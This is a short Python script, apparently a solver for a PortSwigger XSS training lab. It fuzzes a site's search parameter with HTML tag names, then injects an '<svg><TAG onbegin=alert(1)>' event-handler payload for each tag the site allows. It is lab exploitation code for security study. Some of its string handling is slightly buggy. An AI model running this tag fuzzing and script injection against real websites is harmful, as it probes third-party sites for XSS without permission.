"""
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

tags = ['a2', 'abbr', 'acronym', 'a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 
'area', 'article', 'aside', 'audio', 'audio2', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 
'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 
'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 
'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 
'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 
'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 
'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 
'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 
'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 
'video2', 'wbr', 'xmp']
for tag in tags:
    search_url = f'https://{site}/?search=<{tag}>'
    resp = s.get(search_url)
    if resp.status_code == 200:
        print(f'Success: {tag} gives {resp.status_code}')
        search_term = f'''<svg><{tag} onbegin=alert(1)>'''
        search_url = f'https://{site}/?search=<{search_term}>'
        resp = s.get(search_url)